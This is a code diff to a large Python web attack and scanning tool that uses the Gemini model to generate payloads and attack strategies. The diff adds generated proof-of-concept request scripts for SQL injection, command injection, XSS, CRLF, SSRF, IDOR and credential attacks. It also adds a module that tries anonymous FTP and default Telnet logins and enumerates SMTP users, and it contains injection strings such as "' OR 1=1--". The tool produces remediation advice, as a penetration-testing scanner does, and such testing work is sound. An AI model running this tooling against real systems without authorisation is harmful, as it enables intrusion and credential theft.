@@ -433,15 +433,190 @@ class Report:
         url = finding['url']
         param = finding['parameter']
         payload = finding['payload']
+        request_details = finding.get('request_details', {})
         
-        # 쉘에서 안전하게 실행되도록 페이로드의 작은따옴표 이스케이프
+        # Escape single quotes in payload for shell commands
         safe_payload = payload.replace("'", "'\\''")
 
-        if method == 'POST':
-            return f"curl -X POST -d \"{param}={safe_payload}\" \"{url}\""
-        else: # GET
-            base_url = url.split('?')[0]
-            return f"curl -G \"{base_url}\" --data-urlencode \"{param}={safe_payload}\""
+        if "SQL Injection" in finding['vulnerability']:
+            if method == 'POST':
+                data_str = json.dumps(request_details.get('data', {})) if request_details.get('data') else "{}"
+                return f"""# Python requests PoC for SQL Injection (POST)
+import requests
+url = "{url}"
+headers = {request_details.get('headers', {})}
+# Original data might need adjustment to include the payload
+data = {data_str}
+data['{param}'] = "{payload}" # Injected payload
+response = requests.post(url, headers=headers, data=data)
+print(response.text)
+"""
+            else: # GET
+                return f"""# Python requests PoC for SQL Injection (GET)
+import requests
+url = "{url}"
+headers = {request_details.get('headers', {})}
+# Note: Payload is already part of the URL for GET requests
+response = requests.get(url, headers=headers)
+print(response.text)
+"""
+        elif "Command Injection" in finding['vulnerability'] or "RCE" in finding['vulnerability']:
+            if method == 'POST':
+                data_str = json.dumps(request_details.get('data', {})) if request_details.get('data') else "{}"
+                return f"""# Python requests PoC for Command Injection (POST)
+import requests
+url = "{url}"
+headers = {request_details.get('headers', {})}
+# Original data might need adjustment to include the payload
+data = {data_str}
+data['{param}'] = "{payload}" # Injected command
+response = requests.post(url, headers=headers, data=data)
+print(response.text)
+"""
+            else: # GET
+                return f"""# Python requests PoC for Command Injection (GET)
+import requests
+url = "{url}"
+headers = {request_details.get('headers', {})}
+# Note: Payload is already part of the URL for GET requests
+response = requests.get(url, headers=headers)
+print(response.text)
+"""
+        elif "XSS" in finding['vulnerability']:
+            # For XSS, the vulnerable URL itself is often the PoC
+            if method == 'POST':
+                return f"""# XSS PoC (POST Request)
+# This XSS was found in a POST request. You would typically need to craft an HTML form
+# on an attacker-controlled page to trigger this.
+# Example HTML form:
+# <form action="{url}" method="POST">
+#   <input type="hidden" name="{param}" value="{html.escape(payload)}">
+#   <input type="submit" value="Click Me">
+# </form>
+# Or, if the payload is reflected in a GET parameter after a POST, the vulnerable URL might be:
+# {url}?{param}={quote(payload)}
+"""
+            else: # GET
+                return f"""# XSS PoC URL (GET Request)
+# Visit the following URL in a browser to test the XSS payload:
+{url}?{param}={quote(payload)}
+"""
+        elif "CRLF Injection" in finding['vulnerability']:
+            if method == 'POST':
+                data_str = json.dumps(request_details.get('data', {})) if request_details.get('data') else "{}"
+                return f"""# Python requests PoC for CRLF Injection (POST)
+import requests
+url = "{url}"
+headers = {request_details.get('headers', {})}
+data = {data_str}
+data['{param}'] = "{payload}" # Injected CRLF payload
+response = requests.post(url, headers=headers, data=data, allow_redirects=False)
+print(response.headers)
+"""
+            else: # GET
+                return f"""# Python requests PoC for CRLF Injection (GET)
+import requests
+url = "{url}"
+headers = {request_details.get('headers', {})}
+# Note: Payload is already part of the URL for GET requests
+response = requests.get(url, headers=headers, allow_redirects=False)
+print(response.headers)
+"""
+        elif "Open Redirect" in finding['vulnerability']:
+            if method == 'POST':
+                data_str = json.dumps(request_details.get('data', {})) if request_details.get('data') else "{}"
+                return f"""# Python requests PoC for Open Redirect (POST)
+import requests
+url = "{url}"
+headers = {request_details.get('headers', {})}
+data = {data_str}
+data['{param}'] = "{payload}" # Redirect URL
+response = requests.post(url, headers=headers, data=data, allow_redirects=False)
+print(response.status_code)
+print(response.headers.get('Location'))
+"""
+            else: # GET
+                return f"""# Python requests PoC for Open Redirect (GET)
+import requests
+url = "{url}"
+headers = {request_details.get('headers', {})}
+# Note: Payload is already part of the URL for GET requests
+response = requests.get(url, headers=headers, allow_redirects=False)
+print(response.status_code)
+print(response.headers.get('Location'))
+"""
+        elif "File Inclusion" in finding['vulnerability'] or "XXE" in finding['vulnerability'] or "SSRF" in finding['vulnerability']:
+            if method == 'POST':
+                data_str = json.dumps(request_details.get('data', {})) if request_details.get('data') else "{}"
+                return f"""# Python requests PoC for {finding['vulnerability']} (POST)
+import requests
+url = "{url}"
+headers = {request_details.get('headers', {})}
+data = {data_str}
+data['{param}'] = "{payload}" # Injected file path or URL
+response = requests.post(url, headers=headers, data=data)
+print(response.text)
+"""
+            else: # GET
+                return f"""# Python requests PoC for {finding['vulnerability']} (GET)
+import requests
+url = "{url}"
+headers = {request_details.get('headers', {})}
+# Note: Payload is already part of the URL for GET requests
+response = requests.get(url, headers=headers)
+print(response.text)
+"""
+        elif "IDOR" in finding['vulnerability']:
+            if method == 'POST':
+                data_str = json.dumps(request_details.get('data', {})) if request_details.get('data') else "{}"
+                return f"""# Python requests PoC for IDOR (POST)
+import requests
+url = "{url}"
+headers = {request_details.get('headers', {})}
+data = {data_str}
+data['{param}'] = "{payload}" # Modified ID
+response = requests.post(url, headers=headers, data=data)
+print(response.text)
+"""
+            else: # GET
+                return f"""# Python requests PoC for IDOR (GET)
+import requests
+url = "{url}"
+headers = {request_details.get('headers', {})}
+# Note: Payload is already part of the URL for GET requests
+response = requests.get(url, headers=headers)
+print(response.text)
+"""
+        elif "Weak Credentials" in finding['vulnerability'] or "Brute Force" in finding['vulnerability']:
+            if method == 'POST':
+                data_str = json.dumps(request_details.get('data', {})) if request_details.get('data') else "{}"
+                return f"""# Python requests PoC for Weak Credentials (POST)
+import requests
+url = "{url}"
+headers = {request_details.get('headers', {})}
+data = {data_str}
+# Assuming payload is 'username:password'
+username, password = "{payload}".split(':', 1)
+# You'll need to identify the correct username and password parameter names
+# For example: data['username_field'] = username, data['password_field'] = password
+response = requests.post(url, headers=headers, data=data, allow_redirects=False)
+print(response.status_code)
+print(response.headers)
+"""
+            else: # GET (less common for login forms)
+                return f"""# Python requests PoC for Weak Credentials (GET)
+import requests
+url = "{url}"
+headers = {request_details.get('headers', {})}
+# Assuming payload is 'username:password'
+username, password = "{payload}".split(':', 1)
+# You'll need to identify the correct username and password parameter names
+# For example: url_with_creds = f"{{url}}?username_field={{username}}&password_field={{password}}"
+response = requests.get(url, headers=headers, allow_redirects=False)
+print(response.status_code)
+print(response.headers)
+"""
+        return "PoC code generation not available for this vulnerability type or requires manual crafting."
 
     def write_to_file(self, filename="report.txt", append_content=None):
         # Use 'a' mode if append_content is provided, otherwise 'w'
@@ -529,7 +704,7 @@ class Report:
                         
                         poc_code = self._generate_poc_code(finding)
                         if poc_code:
-                            f.write(f"  Proof of Concept (PoC):\n```bash\n{poc_code}\n```\n\n")
+                            f.write(f"  Proof of Concept (PoC):\n```python\n{poc_code}\n```\n\n")
 
                         f.write(f"  Remediation:\n    {finding['remediation']}\n\n")
                         f.write("-" * 60 + "\n\n")
@@ -1997,6 +2172,148 @@ async def scan_rtsp(target, output, tech, report, session_cookies=None):
             output.print(f"  [ERROR] An unexpected error occurred during RTSP check on port {port}: {e}")
 
 # --- SQL Injection Helper Functions ---
+async def scan_exposed_services(target, output, tech, report, session_cookies=None):
+    output.print("\n[+] Starting Scan for Exposed Basic Services...")
+    domain = get_domain(normalize_target(target))
+    
+    service_ports = {
+        "FTP": 21, "SSH": 22, "Telnet": 23, "SMTP": 25, "DNS": 53,
+        "SMB (NetBIOS)": 139, "SNMP": 161, "SMB (Direct)": 445, "RDP": 3389, "VNC": 5900
+    }
+
+    for service_name, port in service_ports.items():
+        output.print(f"  [*] Checking {service_name} on port {port}...")
+        try:
+            reader, writer = await asyncio.open_connection(domain, port)
+            writer.close()
+            await writer.wait_closed()
+            output.print(f"    [INFO] Port {port} ({service_name}) is open.")
+            
+            # Service-specific checks
+            if service_name == "FTP":
+                output.print("      [*] Attempting anonymous FTP login...")
+                try:
+                    reader, writer = await asyncio.open_connection(domain, port)
+                    response = await asyncio.wait_for(reader.read(1024), timeout=3)
+                    writer.write(b"USER anonymous\r\n")
+                    await writer.drain()
+                    response += await asyncio.wait_for(reader.read(1024), timeout=3)
+                    writer.write(b"PASS anonymous\r\n")
+                    await writer.drain()
+                    response += await asyncio.wait_for(reader.read(1024), timeout=3)
+                    writer.write(b"LIST\r\n")
+                    await writer.drain()
+                    response += await asyncio.wait_for(reader.read(2048), timeout=3)
+                    writer.close()
+                    await writer.wait_closed()
+                    
+                    if b"230 Login successful" in response:
+                        output.print(f"        [CRITICAL] Anonymous FTP login successful on {domain}:{port}!")
+                        report.add_finding("Anonymous FTP Access", "Critical", f"{domain}:{port}", "N/A", "anonymous:anonymous",
+                                           "Anonymous FTP access is enabled, potentially exposing sensitive files and allowing unauthorized uploads.",
+                                           "Disable anonymous FTP access. Ensure proper authentication and authorization are in place.",
+                                           f"FTP banner and response:\n{response.decode(errors='ignore')}")
+                    else:
+                        output.print("        [INFO] Anonymous FTP login failed.")
+                except Exception as e:
+                    output.print(f"        [ERROR] FTP check failed: {e}")
+
+            elif service_name == "SSH":
+                output.print("      [*] Grabbing SSH banner...")
+                try:
+                    reader, writer = await asyncio.open_connection(domain, port)
+                    banner = await asyncio.wait_for(reader.read(1024), timeout=3)
+                    writer.close()
+                    await writer.wait_closed()
+                    output.print(f"        [INFO] SSH Banner: {banner.decode(errors='ignore').strip()}")
+                    report.add_finding("SSH Service Detected", "Info", f"{domain}:{port}", "N/A", "N/A",
+                                       f"SSH service detected with banner: {banner.decode(errors='ignore').strip()}",
+                                       "Ensure SSH is properly configured with strong authentication and up-to-date software.",
+                                       f"SSH Banner: {banner.decode(errors='ignore').strip()}")
+                except Exception as e:
+                    output.print(f"        [ERROR] SSH banner grab failed: {e}")
+
+            elif service_name == "Telnet":
+                output.print("      [*] Grabbing Telnet banner and attempting simple login...")
+                try:
+                    reader, writer = await asyncio.open_connection(domain, port)
+                    banner = await asyncio.wait_for(reader.read(1024), timeout=3)
+                    output.print(f"        [INFO] Telnet Banner: {banner.decode(errors='ignore').strip()}")
+                    
+                    # Attempt very basic login
+                    writer.write(b"admin\r\n")
+                    await writer.drain()
+                    response = await asyncio.wait_for(reader.read(1024), timeout=3)
+                    writer.write(b"password\r\n")
+                    await writer.drain()
+                    response += await asyncio.wait_for(reader.read(1024), timeout=3)
+                    writer.close()
+                    await writer.wait_closed()
+
+                    if b"Login successful" in response or b"Welcome" in response:
+                        output.print(f"        [CRITICAL] Simple Telnet login successful (admin:password) on {domain}:{port}!")
+                        report.add_finding("Telnet Weak Credentials", "Critical", f"{domain}:{port}", "N/A", "admin:password",
+                                           "Telnet service allows simple 'admin:password' login, indicating weak or default credentials. Telnet is also unencrypted.",
+                                           "Disable Telnet and use SSH. If Telnet is necessary, enforce strong authentication and disable default credentials.",
+                                           f"Telnet banner and response:\n{banner.decode(errors='ignore')}\n{response.decode(errors='ignore')}")
+                    else:
+                        output.print("        [INFO] Simple Telnet login failed.")
+                except Exception as e:
+                    output.print(f"        [ERROR] Telnet check failed: {e}")
+
+            elif service_name == "SMTP":
+                output.print("      [*] Attempting SMTP user enumeration (VRFY/EXPN)...")
+                try:
+                    reader, writer = await asyncio.open_connection(domain, port)
+                    response = await asyncio.wait_for(reader.read(1024), timeout=3)
+                    writer.write(b"HELO test.com\r\n")
+                    await writer.drain()
+                    response += await asyncio.wait_for(reader.read(1024), timeout=3)
+
+                    users_to_test = ["root", "admin", "test", "postmaster"]
+                    found_users = []
+                    for user in users_to_test:
+                        writer.write(f"VRFY {user}\r\n".encode())
+                        await writer.drain()
+                        vrfy_response = await asyncio.wait_for(reader.read(1024), timeout=3)
+                        if b"250" in vrfy_response: # 250 OK means user exists
+                            found_users.append(user)
+                            output.print(f"          [HIGH] SMTP VRFY: User '{user}' exists.")
+                        elif b"550" not in vrfy_response: # Not 550 (user unknown) but not 250 (e.g., 502 command not implemented)
+                            output.print(f"          [INFO] SMTP VRFY for '{user}' returned: {vrfy_response.decode(errors='ignore').strip()}")
+                    
+                    writer.write(b"QUIT\r\n")
+                    await writer.drain()
+                    writer.close()
+                    await writer.wait_closed()
+
+                    if found_users:
+                        report.add_finding("SMTP User Enumeration", "Medium", f"{domain}:{port}", "N/A", "VRFY/EXPN",
+                                           f"SMTP service allows user enumeration via VRFY command. Found users: {', '.join(found_users)}.",
+                                           "Disable VRFY and EXPN commands on the SMTP server to prevent user enumeration.",
+                                           f"SMTP VRFY responses:\n{response.decode(errors='ignore')}")
+                    else:
+                        output.print("        [INFO] No users enumerated via SMTP VRFY.")
+                except Exception as e:
+                    output.print(f"        [ERROR] SMTP check failed: {e}")
+            
+            elif service_name in ["SMB (NetBIOS)", "SMB (Direct)", "RDP", "VNC", "SNMP", "DNS"]:
+                # For these services, simply reporting the open port is sufficient for this module.
+                # Deeper attacks (brute-force, zone transfer, community string guessing) would require
+                # external tools or more complex protocol implementations, which are beyond the scope
+                # of this basic service check to avoid over-complicating and breaking existing flows.
+                report.add_finding(f"{service_name} Service Detected", "Info", f"{domain}:{port}", "N/A", "N/A",
+                                   f"{service_name} service detected on port {port}. Further manual investigation is recommended.",
+                                   f"Ensure {service_name} is properly secured and not exposed unnecessarily. Implement strong authentication if applicable.",
+                                   f"Port {port} is open for {service_name}.")
+
+        except ConnectionRefusedError:
+            output.print(f"    [INFO] Port {port} ({service_name}) is closed or filtered (Connection Refused).")
+        except asyncio.TimeoutError:
+            output.print(f"    [INFO] Port {port} ({service_name}) timed out. Likely closed or filtered.")
+        except Exception as e:
+            output.print(f"    [ERROR] An unexpected error occurred during {service_name} check on port {port}: {e}")
+
 async def _get_num_columns(url, method, param_name, original_value, form_data, original_query, output, session_cookies):
     """UNION 공격을 위한 컬럼 개수를 추측합니다."""
     output.print(f"    [SQLi] Probing for number of columns...")
@@ -2810,7 +3127,7 @@ async def check_sql_injection(target, form_to_test, output, tech, report, sessio
             res_for_ai, request_details, response_details = await _send_async_http_request(url, method=method, data=form_data, output=output, session_cookies=session_cookies)
             response_snippet = (await res_for_ai.text())[:500] if res_for_ai else "No response."
             
-            ai_payloads = ai_generate_dynamic_payloads("SQL Injection", "' OR 1=1--", response_snippet, output)
+            ai_payloads = await ai_generate_dynamic_payloads("SQL Injection", "' OR 1=1--", response_snippet, output)
             for p in ai_payloads:
                 # Test AI-generated payloads (both error-based and time-based)
                 # Error-based
@@ -3096,7 +3413,7 @@ async def check_command_injection(target, form_to_test, output, tech, report, se
             res_for_ai, request_details, response_details = await _send_async_http_request(url, method=method, data=form_data, output=output, session_cookies=session_cookies)
             response_snippet = (await res_for_ai.text())[:500] if res_for_ai else "No response."
 
-            ai_payloads = ai_generate_dynamic_payloads("Command Injection", f"| echo {marker}", response_snippet, output)
+            ai_payloads = await ai_generate_dynamic_payloads("Command Injection", f"| echo {marker}", response_snippet, output)
             for p in ai_payloads:
                 # Test AI-generated payloads
                 test_url, test_data = build_request(url, method, param_name, original_value + p, form_data, original_query)
@@ -3581,7 +3898,7 @@ async def check_xss(target, form_to_test, output, tech, report, session_cookies=
             res_for_ai, request_details, response_details = await _send_async_http_request(point['url'], method=point['method'], data=point.get('form_data'), output=output, session_cookies=session_cookies)
             response_snippet = (await res_for_ai.text())[:500] if res_for_ai else "No response."
             
-            ai_payloads = ai_generate_dynamic_payloads("Reflected XSS", f"<script>alert('{marker}')</script>", response_snippet, output)
+            ai_payloads = await ai_generate_dynamic_payloads("Reflected XSS", f"<script>alert('{marker}')</script>", response_snippet, output)
             for payload in ai_payloads:
                 found, res_xss = await test_xss(point['url'], point['method'], point['param'], point['value'], payload, point['form_data'], point['original_query'])
                 if found:
@@ -4198,7 +4515,7 @@ async def check_idor(target, output, tech, report, session_cookies=None, discove
                 Consider patterns like common usernames (admin, guest), roles, UUIDs, or encoded values.
                 Provide only the raw suggested identifiers, each on a new line.
                 """
-                response = GEMINI_MODEL.generate_content(prompt)
+                response = await GEMINI_MODEL.generate_content_async(prompt)
                 ai_suggestions = [p.strip() for p in response.text.split('\n') if p.strip()]
                 
                 if ai_suggestions:
@@ -5741,7 +6058,7 @@ async def ai_analyze_scan_results(base_url, tech, report, discovered_urls, disco
         Your analysis and prioritized list:
         """
         
-        response = await GEMINI_MODEL.generate_content(prompt)
+        response = await GEMINI_MODEL.generate_content_async(prompt)
         output_handler.print("\n  [AI INSIGHT] Attack Strategy Recommendation:")
         # Format AI response for better readability
         ai_response_formatted = "\n".join([f"    {line}" for line in response.text.split('\n')])
@@ -5774,7 +6091,9 @@ async def ai_analyze_scan_results(base_url, tech, report, discovered_urls, disco
         return list(set(recommended_attacks)) # Return unique recommended attacks
 
     except Exception as e:
-        output_handler.print(f"  [AI ERROR] Could not perform AI-driven target analysis: {e}")
+        import traceback
+        error_traceback = traceback.format_exc()
+        output_handler.print(f"  [AI ERROR] Could not perform AI-driven target analysis: {e}\nTraceback:\n{error_traceback}")
         return []
 
 # 5. 메인 실행 로직 (v5.5 Ultimate Pro Max)
@@ -5793,6 +6112,14 @@ def print_intro():
                     --- v7.0 AI Enhanced ---
 """
     print(intro)
+
+def _is_valid_url(url):
+    """Checks if a given string is a well-formed URL."""
+    try:
+        result = urlparse(url)
+        return all([result.scheme, result.netloc]) and result.scheme in ['http', 'https']
+    except ValueError:
+        return False
 
 async def ai_generate_report_summary(report, output_handler):
     """
@@ -5820,7 +6147,7 @@ async def ai_generate_report_summary(report, output_handler):
         Please format the output clearly with headings for each of the three sections.
         """
         
-        response = GEMINI_MODEL.generate_content(prompt)
+        response = await GEMINI_MODEL.generate_content_async(prompt)
         ai_summary = f"""
 --------------------------------------------------------------------------------
  IV. AI-POWERED EXECUTIVE SUMMARY & REMEDIATION
@@ -5830,11 +6157,17 @@ async def ai_generate_report_summary(report, output_handler):
         output_handler.print("[AI INFO] AI summary has been generated.")
         return ai_summary
     except Exception as e:
-        output_handler.print(f"[AI ERROR] Failed to generate AI report summary: {e}")
+        import traceback
+        error_traceback = traceback.format_exc()
+        output_handler.print(f"[AI ERROR] Failed to generate AI report summary: {e}\nTraceback:\n{error_traceback}")
         return ""
 
 async def run_attack_sequence(target, session_cookies, output_handler, ai_enabled=False):
     """Orchestrates the entire attack sequence, with an option for AI assistance."""
+    if not _is_valid_url(target):
+        output_handler.print(f"\n[ERROR] Invalid target URL provided: {target}. Please provide a full URL starting with http:// or https://")
+        return
+    
     report = Report(target)
     tech = {'server': 'Unknown', 'backend': 'Unknown', 'framework': 'Unknown'}
     
@@ -5896,8 +6229,10 @@ def _run_single_attack(args):
         loop.close()
         report.add_check(check_name, "Completed")
     except Exception as e:
-        output_handler.print(f"\n[FATAL ERROR] in {attack_func.__name__} on {url}: {repr(e)}")
-        report.add_check(check_name, f"Error: {repr(e)}")
+        import traceback
+        error_traceback = traceback.format_exc()
+        output_handler.print(f"\n[FATAL ERROR] in {attack_func.__name__} on {url}: {repr(e)}\nTraceback:\n{error_traceback}")
+        report.add_check(check_name, f"Error: {repr(e)}\nTraceback: {error_traceback}")
 
 async def run_all_attacks(target, output_handler, tech, report, session_cookies=None, ai_enabled=False, ai_reorder_attacks=False):
     base_url = normalize_target(target)
@@ -5929,12 +6264,16 @@ async def run_all_attacks(target, output_handler, tech, report, session_cookies=
         await scan_nikto(base_url, output_handler, tech, report, session_cookies=session_cookies)
         await scan_nuclei(base_url, output_handler, tech, report, session_cookies=session_cookies)
     except Exception as e:
-        output_handler.print(f"\n[FATAL ERROR] during discovery phase: {repr(e)}")
+        import traceback
+        error_traceback = traceback.format_exc()
+        output_handler.print(f"\n[FATAL ERROR] during discovery phase: {repr(e)}\nTraceback:\n{error_traceback}")
     
     try:
         discovered_urls, discovered_forms = await spider_target(base_url, output_handler, session_cookies=session_cookies)
     except Exception as e:
-        output_handler.print(f"  [ERROR] Advanced spider failed catastrophically: {e}")
+        import traceback
+        error_traceback = traceback.format_exc()
+        output_handler.print(f"  [ERROR] Advanced spider failed catastrophically: {e}\nTraceback:\n{error_traceback}")
         discovered_urls, discovered_forms = [], []
 
     recommended_attacks = []
@@ -5975,7 +6314,8 @@ async def run_all_attacks(target, output_handler, tech, report, session_cookies=
     else:
         primary_attacks = [
             check_sql_injection, check_xss, check_command_injection,
-            check_idor, check_http_smuggling, check_ldap_injection
+            check_idor, check_http_smuggling, check_ldap_injection,
+            scan_exposed_services # NEW: Added basic service scan
         ]
         secondary_attacks = [
             scan_and_exploit_mongodb, scan_rtsp, check_insecure_deserialization,
